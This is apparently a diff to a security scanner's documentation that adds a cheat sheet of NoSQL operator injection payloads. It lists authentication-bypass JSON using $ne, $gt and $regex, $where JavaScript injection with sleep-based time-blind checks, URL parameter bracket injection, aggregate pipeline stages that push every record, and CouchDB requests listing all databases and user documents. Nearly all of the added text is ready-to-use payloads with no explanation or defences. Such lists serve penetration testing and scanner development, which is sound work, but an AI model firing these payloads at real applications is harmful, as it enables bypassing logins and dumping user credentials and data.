@@ -581,3 +581,54 @@ findings with exploit proofs automatically.
 | Primitive id | Coverage |
 |---|---|
 | `nosqlInjection` | NoSQL operator injection |
+
+---
+
+## Cheat Sheet — NoSQL Operator Injection
+
+### Authentication Bypass
+
+```json
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+```
+
+### MongoDB Operator Injection
+
+```json
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$gte": ""}, "password": {"$gte": ""}}
+{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}
+{"$where": "this.username == 'admin'"}
+{"$where": "sleep(5000)"}
+```
+
+### URL Parameter Injection
+
+```
+?username[$ne]=admin&password[$ne]=
+?username[$regex]=^adm&password[$regex]=^pass
+?filter[$where]=return true
+```
+
+### Aggregate Pipeline Injection
+
+```json
+{"$match": {"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}}
+{"$group": {"_id": null, "users": {"$push": "$$ROOT"}}}
+```
+
+### CouchDB Injection
+
+```
+GET /users/_find {"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}
+GET /_all_dbs
+GET /_users/_all_docs
+```
+
+### Time-Based Blind
+
+```json
+{"$where": "if(this.username=='admin'){sleep(5000);return true;}"}
+```
